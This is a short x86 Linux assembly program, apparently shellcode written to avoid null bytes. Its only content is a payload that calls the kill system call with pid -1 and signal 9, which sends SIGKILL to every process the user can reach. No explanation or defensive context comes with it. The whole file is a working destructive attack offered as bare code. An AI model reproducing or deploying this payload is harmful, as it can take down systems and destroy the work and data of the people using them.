section .text

    global _start

_start:
	sub eax, eax
	mov al, 0x23
	inc al
	inc al
	push 0xffffffff
	pop ebx
	mov cl, 0x9
	int 0x80
